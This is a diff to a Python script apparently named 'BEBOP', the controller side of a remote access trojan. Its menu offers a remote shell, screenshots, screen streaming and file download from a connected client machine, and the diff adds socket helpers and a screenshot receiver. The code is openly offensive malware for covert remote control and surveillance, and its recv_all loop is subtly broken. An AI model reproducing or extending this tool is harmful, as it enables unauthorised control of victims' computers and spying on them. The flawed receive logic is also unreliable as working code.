@@ -4,7 +4,7 @@ import threading
 import time
 
 def print_menu():
-    print("/-------BEBOP-------/\n")
+    print("\n/-------BEBOP-------/\n")
     print("1.) Open shell")
     print("2.) Take screenshot")
     print("3.) Begin screen stream")
@@ -27,20 +27,45 @@ def establish_connection():
         sys.exit("Failed to recieve connection to client...Exiting")
 
 
+def recv():
+    return conn_to_client.recv(1024)
+
+def recv_all():
+    data_size = int(conn_to_client.recv(8).decode())
+
+    data = bytes()
+    data_received_count = 0
+    while data_received_count < data_size:
+        data = conn_to_client.recv(1024)
+        if not data_received_count:
+            break
+        data_received_count += len(data)
+
+    return data
+
+def send(buffer):
+    conn_to_client.send(buffer)
+
+def send_all(data):
+    data_size = f"{str(len(data))}\n"
+    conn_to_client.send(data_size.encode())
+    conn_to_client.sendall(data)
+
 def open_shell():
     while True:
         cmd = input("bebop#: ")
         if not cmd:
             cmd = " "
         elif cmd == "exit":
-            conn_to_client.sendall(cmd.encode())
+            send(cmd.encode())
             break
-        conn_to_client.sendall(cmd.encode())
-        output = conn_to_client.recv(1024)
+
+        send(cmd.encode())
+
+        output = recv()
         print(output.decode())
 
 
-# Set blocking
 def download_file():
     file_size = int(conn_to_client.recv(8).decode())
 
@@ -56,6 +81,10 @@ def download_file():
 
     file.close()
 
+def take_screen_shot():
+    file_data = recv_all()
+    with open(f"screen_shot_{time.asctime(time.localtime(time.time()))}.png", "wb") as file:
+        file.write(file_data)
 
 def main():
     establish_connection()
